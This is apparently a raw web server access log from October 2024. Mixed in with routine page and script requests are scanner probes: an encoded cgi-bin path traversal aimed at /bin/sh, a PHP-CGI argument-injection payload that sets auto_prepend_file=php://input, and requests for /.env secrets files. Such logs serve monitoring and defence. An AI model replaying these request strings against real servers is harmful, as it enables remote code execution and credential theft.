185.224.128.47 - - [14/Oct/2024:01:34:34 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
171.241.48.230 - - [14/Oct/2024:01:36:25 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 226 "-" "Custom-AsyncHttpClient"
171.241.48.230 - - [14/Oct/2024:01:36:43 +0000] "POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1" 400 226 "-" "Custom-AsyncHttpClient"
171.241.48.230 - - [14/Oct/2024:01:36:46 +0000] "POST /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1" 302 - "-" "Custom-AsyncHttpClient"
64.62.197.203 - - [14/Oct/2024:01:44:42 +0000] "\x16\x03\x01" 400 226 "-" "-"
52.24.208.224 - - [14/Oct/2024:01:57:40 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
93.123.85.155 - - [14/Oct/2024:02:11:59 +0000] "GET /.env HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
93.123.85.155 - - [14/Oct/2024:02:11:59 +0000] "POST / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.16.39.118 - - [14/Oct/2024:02:35:21 +0000] "GET / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
111.224.192.204 - - [14/Oct/2024:02:58:16 +0000] "HEAD / HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0"
135.125.217.54 - - [14/Oct/2024:03:11:25 +0000] "GET /.env HTTP/1.1" 302 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
135.125.217.54 - - [14/Oct/2024:03:11:26 +0000] "POST / HTTP/1.1" 200 1401 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
193.37.253.202 - - [14/Oct/2024:03:18:50 +0000] "\x16\x03\x01\x02" 400 226 "-" "-"
82.221.113.209 - - [14/Oct/2024:03:18:52 +0000] "GET /wT7Z HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36"
3.144.177.141 - - [14/Oct/2024:03:37:12 +0000] "GET / HTTP/1.1" 200 1401 "-" "Opera/9.80 (Android; Opera Mini/9.0.1829/66.318; U; en) Presto/2.12.423 Version/12.16"
3.144.177.141 - - [14/Oct/2024:03:37:26 +0000] "GET /js/brand.js HTTP/1.1" 200 429 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36"
3.144.177.141 - - [14/Oct/2024:03:37:26 +0000] "GET /js/login.js HTTP/1.1" 200 1751 "-" "Mozilla/5.0 (Linux; Android 9; STF-L09) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36"
3.144.177.141 - - [14/Oct/2024:03:37:26 +0000] "GET //unpkg.com/axios/dist/axios.min.js HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3835.0 Safari/537.36"
3.144.177.141 - - [14/Oct/2024:03:37:44 +0000] "GET /js/login.js HTTP/1.1" 200 1751 "-" "Mozilla/5.0 (Linux; Android 5.1; Lenovo P70-A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36"
3.144.177.141 - - [14/Oct/2024:03:37:44 +0000] "GET /js/brand.js HTTP/1.1" 200 429 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Galeon/2.0.6 (Ubuntu 2.0.6-2)"
3.144.177.141 - - [14/Oct/2024:03:37:44 +0000] "GET //unpkg.com/axios/dist/axios.min.js HTTP/1.1" 302 - "-" "Mozilla/5.0 (Linux; Android 9; BLA-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36"
3.144.177.141 - - [14/Oct/2024:03:38:07 +0000] "GET /js/login.js HTTP/1.1" 200 1751 "-" "Mozilla/5.0 (compatible; Konqueror/4.4; Linux) KHTML/4.4.1 (like Gecko) Fedora/4.4.1-1.fc12"
3.144.177.141 - - [14/Oct/2024:03:38:07 +0000] "GET /js/brand.js HTTP/1.1" 200 429 "-" "Mozilla/5.0 (Linux; Android 9; Pixel 2 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36"
